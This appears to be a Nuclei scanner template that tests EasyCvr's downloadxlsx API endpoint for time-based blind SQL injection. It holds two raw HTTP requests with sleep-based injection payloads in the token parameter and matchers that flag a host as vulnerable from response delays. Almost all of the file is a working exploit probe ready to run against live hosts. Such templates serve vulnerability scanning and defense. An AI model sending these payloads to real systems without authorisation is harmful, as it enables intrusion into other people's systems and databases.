id: EasyCvr-downloadxlsx-sql

info:
  name: EasyCvr downloadxlsx 存在sql注入漏洞
  author: EasyCvr
  severity: high
  tags: EasyCvr

http:
  - raw:
      - |+
        GET /api/v1/cascade/downloadxlsx?token='and(select*from(select/**/sleep(2))a/**/union/**/select+1)=' HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Cookie: token=iLHaZhzvg
        Accept-Language: zh-CN,zh;q=0.9

      - |+
        GET /api/v1/cascade/downloadxlsx?token='and(select*from(select/**/sleep(4))a/**/union/**/select+1)=' HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Cookie: token=iLHaZhzvg
        Accept-Language: zh-CN,zh;q=0.9

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=2 && duration_1<4'  
          - 'duration_2>=4 && duration_2<6'
        condition: and

